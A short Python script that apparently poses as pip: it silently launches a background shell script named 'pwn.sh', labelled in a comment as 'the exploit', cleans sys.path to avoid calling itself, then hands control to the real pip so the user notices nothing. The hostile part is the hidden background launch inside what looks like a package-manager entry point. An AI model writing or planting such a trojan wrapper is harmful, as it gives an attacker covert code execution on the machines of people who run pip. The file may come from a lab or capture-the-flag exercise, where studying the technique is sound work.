import os
import subprocess
import sys

# Background the exploit
try:
    subprocess.Popen(['bash', 'pwn.sh'], start_new_session=True)
except:
    pass

# Remove current directory from sys.path to avoid recursion
cwd = os.getcwd()
while cwd in sys.path:
    sys.path.remove(cwd)
while '' in sys.path:
    sys.path.remove('')

# Proxy to real pip
import pip
if __name__ == '__main__':
    sys.exit(pip.main())
